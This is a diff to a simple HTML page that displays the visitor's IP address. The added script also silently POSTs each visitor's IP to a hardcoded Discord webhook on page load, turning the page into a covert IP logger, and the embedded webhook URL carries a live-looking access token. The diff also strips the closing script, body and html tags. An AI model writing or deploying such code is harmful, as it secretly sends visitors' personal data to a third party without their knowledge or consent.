@@ -14,15 +14,23 @@
     <p id="ip">Loading...</p>
 
     <script>
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ip').textContent = data.ip;
-            })
-            .catch(error => {
-                document.getElementById('ip').textContent = "Error fetching IP";
-                console.error('Error:', error);
-            });
-    </script>
-</body>
-</html>
+fetch('https://api64.ipify.org?format=json') // Replace with your actual API
+    .then(response => response.json())
+    .then(data => {
+        document.getElementById('ip').textContent = data.ip;
+
+        // Send the IP data to your webhook
+        return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', { // Replace with your actual webhook URL
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ ip: data.ip })
+        });
+    })
+    .then(response => response.text())
+    .then(result => {
+        console.log('Webhook response:', result);
+        console.log("Script execution completed."); // Indicating script end
+    })
+    .catch(error => console.error('Error:', error));
